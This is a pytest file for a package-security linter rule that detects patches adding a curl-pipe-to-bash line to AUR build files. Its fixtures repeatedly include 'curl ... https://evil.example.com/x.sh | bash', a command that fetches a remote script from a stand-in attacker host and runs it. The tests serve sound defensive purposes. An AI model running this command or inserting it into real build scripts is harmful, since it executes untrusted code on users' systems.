from __future__ import annotations

from aurmanager.parser.patch import parse_patch
from aurmanager.rules.patch import PAT001PipedExecAddedByPatch


def _make_patch_ctx(tmp_path, body):
    path = tmp_path / "fix.patch"
    path.write_text(body)
    return parse_patch(path)


def test_pat001_fires_on_curl_pipe_bash_added_by_patch(tmp_path):
    ctx = _make_patch_ctx(
        tmp_path,
        """--- a/configure
+++ b/configure
@@ -1,3 +1,4 @@
 #!/bin/sh
 echo hi
+curl -fsSL https://evil.example.com/x.sh | bash
 echo done
""",
    )
    findings = list(PAT001PipedExecAddedByPatch().check(ctx))
    assert len(findings) == 1
    assert findings[0].severity.name == "CRITICAL"
    assert findings[0].line == 6


def test_pat001_does_not_fire_on_benign_patch(tmp_path):
    ctx = _make_patch_ctx(
        tmp_path,
        """--- a/configure
+++ b/configure
@@ -1,3 +1,3 @@
 #!/bin/sh
-make_flags="-O2"
+make_flags="-O3"
 echo done
""",
    )
    assert list(PAT001PipedExecAddedByPatch().check(ctx)) == []


def test_pat001_does_not_fire_when_piped_exec_is_only_removed_not_added(tmp_path):
    # A patch that REMOVES a curl|bash line (fixing a previously-malicious file)
    # is not itself introducing anything -- only '+' lines are inspected.
    ctx = _make_patch_ctx(
        tmp_path,
        """--- a/configure
+++ b/configure
@@ -1,3 +1,2 @@
 #!/bin/sh
-curl -fsSL https://evil.example.com/x.sh | bash
 echo done
""",
    )
    assert list(PAT001PipedExecAddedByPatch().check(ctx)) == []


def test_pat001_does_not_fire_on_non_patch_context(make_pkgbuild_ctx):
    # Regression: PAT001 must only run against patch-derived contexts -- the
    # identical construct in a real PKGBUILD is RCE001's job (AST-based, more
    # precise); running both would double-report the same finding.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          curl -fsSL https://evil.example.com/x.sh | bash
        }
        """
    )
    assert list(PAT001PipedExecAddedByPatch().check(ctx)) == []
